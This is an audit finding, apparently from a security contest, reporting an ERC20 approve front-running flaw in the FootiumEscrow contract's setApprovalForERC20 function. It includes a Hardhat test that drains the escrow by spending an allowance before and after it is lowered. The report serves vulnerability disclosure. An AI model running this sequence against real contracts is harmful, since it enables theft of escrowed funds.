# The escrow “setApprovalForERC20” function is vulnerable to a sandwich attack

## Summary

The approve() function in ERC20 can cause token theft when a user re-invokes it for a previously authorized spender, as the spender can front-run the transaction and transfer the previous value using **`transferFrom()`** before authorization to transfer the new value is granted.

## Vulnerability Detail

The FootiumEscrow contract's **`setApprovalForERC20()`** function is susceptible to the well-known "approve front-running" attack. In this scenario, if a malicious user or protocol gains an ERC20 allowance, they can take advantage of it by front-running the next approval transaction related to them, allowing them to spend more than intended and essentially steal funds from the club's escrow. This document offers a comprehensive explanation of the matter at hand: https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit

## Impact

Resulting in the loss of funds for the owner of the escrow.

## Code Snippet

The code section in question is: **[[FootiumEscrow.sol/L75-L81]](https://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumEscrow.sol#L75-L81)**

Here is a Hardhat proof of concept (PoC) that documents the problem:

```jsx
// Place it in the FootiumClubMinter.test.ts file.
it("Sandwiching approvals", async () => {
  // Set up variables and contracts
  const tokenID1 = 1;
  let user1, user2, token;
  [, , user1, user2] = await ethers.getSigners();
  token = await deployProxy("FootiumToken");

  // Mint a club token for User1
  await expect(clubMinter.mint(user1.address, tokenID1))
    .to.emit(clubs, "Transfer")
    .withArgs(ZERO_ADDRESS, user1.address, tokenID1);

  // Retrieve the FootiumEscrow contract associated with the club token
  const escrowAddress = await clubs.clubToEscrow(tokenID1);
  const escrow = await ethers.getContractAt("FootiumEscrow", escrowAddress);

  // Mint some FootiumTokens and transfer them to the escrow for later use
  await token.mint(escrow.address, "100");

  // User1 approves User2 to spend 80 FootiumTokens from the escrow
  await escrow.connect(user1).setApprovalForERC20(token.address, user2.address, "80");

  // After some time, User2 has not spent any tokens and User1 wants to decrease the allowance to 20 FootiumTokens

  // However, User2 exploits the approval front-running vulnerability and transfers the full 80 tokens to themselves
  await token.connect(user2).transferFrom(escrow.address, user2.address, "80");

  // User1 lowers the allowance to 20 FootiumTokens, unaware that User2 has already taken the full allowance
  await escrow.connect(user1).setApprovalForERC20(token.address, user2.address, "20");

  // User2 takes advantage of the allowance again and spends the remaining 20 FootiumTokens
  await token.connect(user2).transferFrom(escrow.address, user2.address, "20");

  const bal = await token.balanceOf(escrow.address);
  console.log(bal);

  // Confirm that the escrow balance for User1 is now 0 FootiumTokens
  expect(bal).to.be.eq("0");
});
```

## Tool used

Manual Review, Hardhat

## Recommendation

We recommend implementing the solution outlined in the referenced document to address this vulnerability.
